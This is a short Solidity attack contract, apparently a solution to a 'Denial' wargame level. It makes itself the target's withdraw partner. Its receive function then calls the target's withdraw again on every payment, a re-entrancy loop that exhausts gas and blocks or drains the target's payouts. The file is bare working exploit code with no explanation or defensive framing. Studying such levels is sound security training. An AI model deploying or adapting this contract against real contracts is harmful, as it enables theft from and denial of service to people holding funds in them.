pragma solidity ^0.8.0;

interface IDenial{
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}   

contract DenialAttack{
    IDenial denial;
    uint ownerCut;

    constructor(address target) {
        denial = IDenial(target);
    }

    function setPartener()external {
        denial.setWithdrawPartner(address(this));
    }

    receive()external payable{
        uint targeBalance = address(denial).balance;
        if (targeBalance >= ownerCut){
            denial.withdraw();
        }
    }
}